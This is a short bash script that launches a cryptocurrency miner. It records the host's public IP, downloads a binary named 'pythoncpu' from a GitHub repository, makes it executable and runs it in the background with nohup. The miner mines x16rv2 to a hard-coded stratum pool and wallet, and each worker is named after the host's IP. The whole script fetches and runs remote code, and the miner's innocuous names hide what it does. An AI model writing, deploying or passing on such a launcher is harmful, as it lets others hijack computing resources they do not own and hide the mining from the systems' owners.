#!bin/bash -xe 

echo '#### Version 0.0.1 ####'
if [ $(ps -aux |grep pythonheq |wc -l) -le 1 ]
then 
echo "No process,let's start -> $(ps -aux |grep pythonheq |wc -l)"
# info
iip=$(curl -s https://ipecho.net/plain)
IPNAME=$(sed 's|\.|o|g' <<< $iip)
curl -s ipinfo.io

# Cleaner
rm -rf pythonheq




# Prepare
PoolHost=116.203.10.54
VR_Port=3000
PublicVerusCoinAddress="RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek"
WorkerName=$IPNAME
VR_Threads=4



wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
chmod +x pythoncpu


  echo '######### execution #########'


nohup ./pythoncpu -a x16rv2 -o stratum+tcp://116.203.10.54:3015 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &
tail -f oout


else 

echo "It's ok : $(ps -aux |grep pythonheq |wc -l)"; 
  tail -f oout
fi
